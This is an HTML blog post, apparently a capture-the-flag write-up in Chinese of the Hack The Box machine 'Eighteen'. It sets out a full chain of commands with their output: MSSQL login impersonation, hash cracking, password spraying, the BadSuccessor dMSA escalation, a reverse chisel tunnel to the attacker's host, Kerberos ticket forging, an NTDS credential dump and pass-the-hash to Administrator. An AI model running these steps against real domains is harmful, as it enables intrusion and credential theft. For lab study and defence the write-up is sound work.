@@ -1,0 +1,574 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"dawoxiansigema.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="The Eighteen HTB machine is an “Easy” rated Linux box, making it an excellent platform for those new to penetration testing. It’s designed to teach fundamental concepts in a practical, hands-on way. Y">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Eighteen">
+<meta property="og:url" content="http://dawoxiansigema.github.io/2025/11/28/Eighteen/index.html">
+<meta property="og:site_name" content="Eur3ka&#39;s Studio">
+<meta property="og:description" content="The Eighteen HTB machine is an “Easy” rated Linux box, making it an excellent platform for those new to penetration testing. It’s designed to teach fundamental concepts in a practical, hands-on way. Y">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://dawoxiansigema.github.io/2025/11/28/Eighteen/1.png">
+<meta property="article:published_time" content="2025-11-28T03:20:42.000Z">
+<meta property="article:modified_time" content="2025-12-02T12:35:45.641Z">
+<meta property="article:author" content="Xu Haoxiang">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://dawoxiansigema.github.io/2025/11/28/Eighteen/1.png">
+
+
+<link rel="canonical" href="http://dawoxiansigema.github.io/2025/11/28/Eighteen/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://dawoxiansigema.github.io/2025/11/28/Eighteen/","path":"2025/11/28/Eighteen/","title":"Eighteen"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Eighteen | Eur3ka's Studio</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Eur3ka's Studio</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-docs"><a href="/docs/" rel="section"><i class="fa fa-book fa-fw"></i>Docs</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Recon"><span class="nav-number">1.</span> <span class="nav-text">Recon</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Shell-as-adam-scott"><span class="nav-number">2.</span> <span class="nav-text">Shell as adam.scott</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Shell-as-root"><span class="nav-number">3.</span> <span class="nav-text">Shell as root</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#PSRemote-Failed"><span class="nav-number">3.1.</span> <span class="nav-text">PSRemote Failed</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BadSuccessor"><span class="nav-number">3.2.</span> <span class="nav-text">BadSuccessor</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%9D%83%E9%99%90"><span class="nav-number">3.2.1.</span> <span class="nav-text">获取权限</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BB%BA%E7%AB%8B%E9%9A%A7%E9%81%93"><span class="nav-number">3.2.2.</span> <span class="nav-text">建立隧道</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96Service-Ticket"><span class="nav-number">3.2.3.</span> <span class="nav-text">获取Service Ticket</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E5%8F%96%E5%9F%9F%E6%8E%A7%E5%93%88%E5%B8%8C%E5%B9%B6%E4%BC%A0%E9%80%92"><span class="nav-number">3.2.4.</span> <span class="nav-text">提取域控哈希并传递</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Xu Haoxiang"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Xu Haoxiang</p>
+  <div class="site-description" itemprop="description">Never again.</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">categories</span>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://dawoxiansigema.github.io/2025/11/28/Eighteen/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Xu Haoxiang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Eur3ka's Studio">
+      <meta itemprop="description" content="Never again.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Eighteen | Eur3ka's Studio">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Eighteen
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2025-11-28 11:20:42" itemprop="dateCreated datePublished" datetime="2025-11-28T11:20:42+08:00">2025-11-28</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2025-12-02 20:35:45" itemprop="dateModified" datetime="2025-12-02T20:35:45+08:00">2025-12-02</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Windows-Penetration-in-HTB/" itemprop="url" rel="index"><span itemprop="name">Windows Penetration in HTB</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>The Eighteen HTB machine is an “Easy” rated Linux box, making it an excellent platform for those new to penetration testing. It’s designed to teach fundamental concepts in a practical, hands-on way. You’ll move from basic enumeration to more complex exploitation and privilege escalation.</p>
+<span id="more"></span>
+
+<h1 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h1><pre><code>❯ sudo nmap -sCV 10.10.11.95
+Starting Nmap 7.98 ( https://nmap.org ) at 2025-11-28 10:50 +0800
+Nmap scan report for 10.10.11.95
+Host is up (0.29s latency).
+Not shown: 997 filtered tcp ports (no-response)
+PORT     STATE SERVICE  VERSION
+80/tcp   open  http     Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Did not follow redirect to http://eighteen.htb/
+1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
+|_ssl-date: 2025-11-28T09:50:37+00:00; +6h59m48s from scanner time.
+| ms-sql-ntlm-info:
+|   10.10.11.95:1433:
+|     Target_Name: EIGHTEEN
+##
+|     NetBIOS_Domain_Name: EIGHTEEN
+|     NetBIOS_Computer_Name: DC01
+##
+|     DNS_Domain_Name: eighteen.htb
+##
+|     DNS_Computer_Name: DC01.eighteen.htb
+|     DNS_Tree_Name: eighteen.htb
+##
+|_    Product_Version: 10.0.26100
+| ms-sql-info:
+|   10.10.11.95:1433:
+|     Version:
+|       name: Microsoft SQL Server 2022 RTM
+|       number: 16.00.1000.00
+|       Product: Microsoft SQL Server 2022
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2025-11-26T22:21:44
+|_Not valid after:  2055-11-26T22:21:44
+5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 6h59m47s, deviation: 0s, median: 6h59m47s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 42.62 seconds
+</code></pre>
+<p>基本的嗅探后 发现是常规的windows测试 渗透思路可以从http或者mssql入手</p>
+<pre><code>10.10.11.95 eighteen.htb dc01.eighteen.htb
+</code></pre>
+<p>添加hosts后发现 无论是域名还是子域名直接访问都是502 那么转而从mssql入手 </p>
+<h1 id="Shell-as-adam-scott"><a href="#Shell-as-adam-scott" class="headerlink" title="Shell as adam.scott"></a>Shell as adam.scott</h1><pre><code>SQL (kevin  guest@master)&gt; SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = &#39;IMPERSONATE&#39;
+name
+------
+appdev
+SQL (kevin  guest@master)&gt; EXECUTE AS LOGIN = &#39;appdev&#39;
+SQL (appdev  appdev@master)&gt; use financial_planner
+ENVCHANGE(DATABASE): Old Value: master, New Value: financial_planner
+INFO(DC01): Line 1: Changed database context to &#39;financial_planner&#39;.
+SQL (appdev  appdev@financial_planner)&gt; SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = &#39;BASE TABLE&#39;;
+TABLE_NAME
+-----------
+users
+incomes
+expenses
+allocations
+analytics
+visits
+SQL (appdev  appdev@financial_planner)&gt; select * from users
+  id   full_name   username   email                password_hash                                                                                            is_admin   created_at
+----   ---------   --------   ------------------   ------------------------------------------------------------------------------------------------------   --------   ----------
+1002   admin       admin      admin@eighteen.htb   pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133          1   2025-10-29 05:39:03
+</code></pre>
+<p>一番操作后我们获取了pbkdf2-sha256形式的密钥 好像hashcat还不支持直接爆破 需要转换一下 上网搜了一下 <a target="_blank" rel="noopener" href="https://github.com/hashcat/hashcat/issues/1583">找到一篇文章</a> 但是里面说的有些不适用这道题</p>
+<pre><code>pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133
+</code></pre>
+<p>对源哈希拆开解析</p>
+<ul>
+<li>第一段 <code>pbkdf2:sha256:600000</code> 表示密钥派生函数是PBKDF2 杂凑算法是SHA256 迭代60000次</li>
+<li>第二段 <code>AMtzteQIG7yAbZIa</code> 为盐值</li>
+<li>第三段 <code>0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133</code> 为将二进制的哈希结果转换为16进制文本</li>
+</ul>
+<p>参考那篇文章后 给出的做法是将盐值和哈希结果一并使用如下命令转换为字节流后再base编码</p>
+<pre><code>perl -e &#39;print pack (&quot;H*&quot;, &quot;0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133&quot;)&#39; | base64
+</code></pre>
+<p>但是实际上对于这题而言 实际测试后盐值为直接base64编码即可 最终结果如下</p>
+<pre><code>sha256:600000:QU10enRlUUlHN3lBYlpJYQ==:BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=
+</code></pre>
+<p>经过hashact后 解开密码为<code>iloveyou1</code> 然后通过kevin的用户凭据 批量爆破出mssql剩下的用户 并保存为user 用于密码爆破</p>
+<pre><code>❯ netexec mssql 10.10.11.95 -u kevin -p iNa2we6haRj2gaw! --local-auth --rid-brute
+MSSQL       10.10.11.95     1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb)
+MSSQL       10.10.11.95     1433   DC01             [+] DC01\kevin:iNa2we6haRj2gaw!
+MSSQL       10.10.11.95     1433   DC01             498: EIGHTEEN\Enterprise Read-only Domain Controllers
+MSSQL       10.10.11.95     1433   DC01             500: EIGHTEEN\Administrator
+MSSQL       10.10.11.95     1433   DC01             501: EIGHTEEN\Guest
+MSSQL       10.10.11.95     1433   DC01             502: EIGHTEEN\krbtgt
+...
+
+❯ netexec mssql 10.10.11.95 -u user -p iloveyou1
+failed
+❯ netexec winrm 10.10.11.95 -u user -p iloveyou1 --continue-on-success
+...
+htb\mssqlsvc:iloveyou1
+WINRM       10.10.11.95     5985   DC01             [-] eighteen.htb\DC01$:iloveyou1
+WINRM       10.10.11.95     5985   DC01             [-] eighteen.htb\SQLServer2005SQLBrowserUser$DC01:iloveyou1
+WINRM       10.10.11.95     5985   DC01             [-] eighteen.htb\jamie.dunn:iloveyou1
+WINRM       10.10.11.95     5985   DC01             [-] eighteen.htb\jane.smith:iloveyou1
+WINRM       10.10.11.95     5985   DC01             [-] eighteen.htb\alice.jones:iloveyou1
+WINRM       10.10.11.95     5985   DC01             [+] eighteen.htb\adam.scott:iloveyou1 (Pwn3d!)
+...
+</code></pre>
+<p>使用evil-winrm连接并获取user.txt</p>
+<pre><code>❯ evil-winrm -i 10.10.11.95 -u adam.scott -p iloveyou1
+
+Evil-WinRM shell v3.7
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\adam.scott\Documents&gt;
+</code></pre>
+<h1 id="Shell-as-root"><a href="#Shell-as-root" class="headerlink" title="Shell as root"></a>Shell as root</h1><h2 id="PSRemote-Failed"><a href="#PSRemote-Failed" class="headerlink" title="PSRemote Failed"></a>PSRemote Failed</h2><p><img src="/2025/11/28/Eighteen/1.png"></p>
+<p>最开始没有什么想法 放到了bloodhound上后 发现adam.scott有可以直接提权建议</p>
+<pre><code>$SecPassword = ConvertTo-SecureString &#39;Password123!&#39; -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential(&#39;TESTLAB\dfm.a&#39;, $SecPassword)
+Then use the New-PSSession command with the credential we just created:
+
+$session = New-PSSession -ComputerName DC01.EIGHTEEN.HTB -Credential $Cred
+</code></pre>
+<p>用这个payload是打通了 但是打通后权限还是不足 于是乎没得办法</p>
+<h2 id="BadSuccessor"><a href="#BadSuccessor" class="headerlink" title="BadSuccessor"></a>BadSuccessor</h2><h3 id="获取权限"><a href="#获取权限" class="headerlink" title="获取权限"></a>获取权限</h3><pre><code>*Evil-WinRM* PS C:\Users\adam.scott\Documents&gt; Get-ItemProperty &#39;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion&#39;
+...
+ProductName               : Windows Server 2025 Datacenter
+...
+</code></pre>
+<p>发现windows版本 上网google到有<a target="_blank" rel="noopener" href="https://www.rbtsec.com/blog/badsuccessor-escalating-privileges-via-dmsa-in-windows-server-2025/">BadSuccessor</a>的洞 这个洞是针对DMSA账户的 简单来说是因为</p>
+<ul>
+<li>HACK_DMSA$ 可模拟Administrator等域管账户 获取访问域控的服务票据ST</li>
+<li>HACK_DMSA$ 有权限读取 NTDS.dit 数据库 那么就可以读取管理员用户哈希了</li>
+</ul>
+<p>于是乎要实施攻击的话 需要准备两个东西</p>
+<ul>
+<li>先是BadSuccessor的exploit脚本 在这个<a target="_blank" rel="noopener" href="https://github.com/LuemmelSec/Pentest-Tools-Collection">合集</a>里面可以找到</li>
+<li>再一个是<a target="_blank" rel="noopener" href="https://github.com/jpillora/chisel">chisel</a> <strong>因为我们并没有对域控88端口的直接访问能力</strong> 所以我们需要以chisel建立隧道进行转发 不建议kali端使用apt进行安装 因为版本不一样可能会丢包(大坑)</li>
+</ul>
+<p>分别上传后 先使用脚本进行攻击 BadSuccessor的操作指南可在文件开头部分找到</p>
+<pre><code>*Evil-WinRM* PS C:\Users\adam.scott\Documents&gt; cd ../HACK
+*Evil-WinRM* PS C:\Users\adam.scott\HACK&gt; . .\BadSuccessor.ps1
+*Evil-WinRM* PS C:\Users\adam.scott\HACK&gt; BadSuccessor -Mode Exploit -Domain &quot;eighteen.htb&quot; -Path &quot;OU=Staff,DC=eighteen,DC=htb&quot; -Name &quot;HACK_DMSA&quot; -DelegatedAdmin &quot;adam.scott&quot; -DelegateTarget &quot;Administrator&quot;
+Creating dMSA at: LDAP://eighteen.htb/OU=Staff,DC=eighteen,DC=htb
+0
+0
+0
+0
+Successfully created and configured dMSA &#39;HACK_DMSA&#39;
+Object adam.scott can now impersonate Administrator
+</code></pre>
+<h3 id="建立隧道"><a href="#建立隧道" class="headerlink" title="建立隧道"></a>建立隧道</h3><p>鉴于我们无法访问域控 所以需要建立chisel隧道</p>
+<pre><code>*Evil-WinRM* PS C:\Users\adam.scott\Documents&gt; ../HACK/chisel.exe client 10.10.16.7:8011 R:socks
+                                                                 
+┌──(kali㉿kali)-[~]
+└─$ chisel server -p 8011 --reverse
+2025/12/02 12:58:28 server: Reverse tunnelling enabled
+2025/12/02 12:58:28 server: Fingerprint sE0zd4ZQ1HOuL/wNjcxgPCUfrOHY+VfIYIOE1wDDLn8=
+2025/12/02 12:58:28 server: Listening on http://0.0.0.0:8011
+2025/12/02 12:58:34 server: session#1: Client version (1.11.3) differs from server version (1.11.3-0kali1)
+2025/12/02 12:58:34 server: session#1: tun: proxy#R:127.0.0.1:1080=&gt;socks: Listening
+</code></pre>
+<p>可以在server端这边加一个-v 用来debug信息</p>
+<h3 id="获取Service-Ticket"><a href="#获取Service-Ticket" class="headerlink" title="获取Service Ticket"></a>获取Service Ticket</h3><p>通过<code>S4U2self/S4U2proxy</code>协议 为指定用户或模拟用户 申请目标服务的Kerberos票据ST 实现权限委派攻击</p>
+<pre><code>┌──(impacket-venv)─(kali㉿kali)-[~/Desktop/red/impacket-0.13.0/examples]
+└─$ proxychains4 python3 getST.py -impersonate &#39;HACK_DMSA$&#39; -dmsa eighteen.htb/adam.scott -self
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/aarch64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+Impacket v0.14.0.dev0+20251127.200842.2c47948c - Copyright Fortra, LLC and its affiliated companies
+
+Password:
+[*] Impersonating HACK_DMSA$
+[*] Requesting S4U2self
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.11.95:88  ...  OK
+[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+</code></pre>
+<p>发现kerberos提示时间差过大 但是使用<code>ntpdate</code>指令也无法同步</p>
+<pre><code>┌──(impacket-venv)─(kali㉿kali)-[~/Desktop/red/impacket-0.13.0/examples]
+└─$ ntpdate 10.10.11.95
+ntpdig: no eligible servers
+</code></pre>
+<p>此时又有一个大坑 <strong>不能直接在evil-winrm中使用date指令获取时间并用来同步</strong> 可以在getST.py中加入-debug来获取当前域控的准确时间</p>
+<pre><code>┌──(impacket-venv)─(kali㉿kali)-[~/Desktop/red/impacket-0.13.0/examples]
+└─$ proxychains4 python3 getST.py -impersonate &#39;HACK_DMSA$&#39; -dmsa eighteen.htb/adam.scott -self  -debug
+...
+[*] Requesting S4U2self
+[+] Trying to connect to KDC at eighteen.htb:88
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.11.95:88  ...  OK
+[+] Server time (UTC): 2025-12-02 19:04:49(⬅Check this!)
+[+] Exception
+Traceback (most recent call last):
+  File &quot;/home/kali/Desktop/red/impacket-0.13.0/examples/getST.py&quot;, line 824, in run
+    tgs, cipher, oldSessionKey, sessionKey = self.doS4U(tgt, cipher, oldSessionKey, sessionKey, unhexlify(self.__nthash), self.__aesKey, self.__kdcHost)
+                                             ~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File &quot;/home/kali/Desktop/red/impacket-0.13.0/examples/getST.py&quot;, line 551, in doS4U
+    r = sendReceive(message, self.__domain, kdcHost)
+  File &quot;/home/kali/Desktop/red/impacket-venv/lib/python3.13/site-packages/impacket/krb5/kerberosv5.py&quot;, line 93, in sendReceive
+    raise krbError
+impacket.krb5.kerberosv5.KerberosError: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+</code></pre>
+<p>然后使用如下命令即可同步时间 误差尽可能小 所以需要打提前量 同步后就可以打通啦</p>
+<pre><code>┌──(impacket-venv)─(kali㉿kali)-[~/Desktop/red/impacket-0.13.0/examples]
+└─$ sudo date -u -s &quot;2025-12-02 19:09:53&quot;
+Tue Dec  2 07:09:53 PM UTC 2025
+
+┌──(impacket-venv)─(kali㉿kali)-[~/Desktop/red/impacket-0.13.0/examples]
+└─$ python3 getSTSocks.py -impersonate &#39;HACK_DMSA$&#39; -dmsa eighteen.htb/adam.scott -self  -debug
+...
+[+] Found encrypted_pa_data, searching for DMSA key package...
+[+] Found encrypted padata type: 171 (0xab)
+[*] Current keys:
+[*] EncryptionTypes.aes256_cts_hmac_sha1_96:c0d967b0e096d3e69c67f174d606dd93e069af99b25bb9c31ffe331cafdb2323
+[*] EncryptionTypes.aes128_cts_hmac_sha1_96:df3f12a2485327b898c2de874487bcb8
+[*] EncryptionTypes.rc4_hmac:0db5060cb6c7a391aaa3e69271e5c8c2
+[*] Previous keys:
+[*] EncryptionTypes.rc4_hmac:0b133be956bfaddf9cea56701affddec
+[+] Found encrypted padata type: 165 (0xa5)
+[*] Saving ticket in HACK_DMSA$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache
+</code></pre>
+<h3 id="提取域控哈希并传递"><a href="#提取域控哈希并传递" class="headerlink" title="提取域控哈希并传递"></a>提取域控哈希并传递</h3><p>这一步也同样需要手动校对时间 同样是以-debug参数来获取server的时间 在使用脚本时记得设置环境变量</p>
+<pre><code>┌──(impacket-venv)─(kali㉿kali)-[~/Desktop/red/impacket-0.13.0/examples]
+└─$ export KRB5CCNAME=HACK_DMSA\$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache
+
+┌──(impacket-venv)─(kali㉿kali)-[~/Desktop/red/impacket-0.13.0/examples]
+└─$ proxychains4 python3 secretsdump.py -k -no-pass dc01.eighteen.htb -just-dc-user Administrator -debug
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/aarch64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+Impacket v0.14.0.dev0+20251127.200842.2c47948c - Copyright Fortra, LLC and its affiliated companies
+...
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:0b133be956bfaddf9cea56701affddec:::
+[*] Kerberos keys grabbed
+Administrator:0x14:977d41fb9cb35c5a28280a6458db3348ed1a14d09248918d182a9d3866809d7b
+Administrator:0x13:5ebe190ad8b5efaaae5928226046dfc0
+Administrator:aes256-cts-hmac-sha1-96:1acd569d364cbf11302bfe05a42c4fa5a7794bab212d0cda92afb586193eaeb2
+Administrator:aes128-cts-hmac-sha1-96:7b6b4158f2b9356c021c2b35d000d55f
+Administrator:0x17:0b133be956bfaddf9cea56701affddec
+[*] Cleaning up...
+</code></pre>
+<p>可能会出现<code>KDC_ERR_TGT_REVOKED(TGT has been revoked)</code>的报错 那么应该是时间长了 需要BadSuccessor脚本重新打一遍 获得哈希后那直接传递就可以了</p>
+<pre><code>┌──(impacket-venv)─(kali㉿kali)-[~/Desktop/red/impacket-0.13.0/examples]
+└─$ proxychains4 python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:0b133be956bfaddf9cea56701affddec eighteen.htb/Administrator@dc01.eighteen.htb
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/aarch64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+Impacket v0.14.0.dev0+20251127.200842.2c47948c - Copyright Fortra, LLC and its affiliated companies
+
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.11.95:445  ...  OK
+[*] SMBv3.0 dialect used
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.11.95:135  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.11.95:57856  ...  OK
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\&gt;whoami
+eighteen\administrator
+</code></pre>
+<p>至此成功获取administrator权限</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/11/27/Administrator/" rel="prev" title="Administrator">
+                  <i class="fa fa-angle-left"></i> Administrator
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2025/11/28/Mssql%E6%B8%97%E9%80%8F%E6%9E%9A%E4%B8%BE/" rel="next" title="Mssql渗透枚举">
+                  Mssql渗透枚举 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Xu Haoxiang</span>
+  </div>
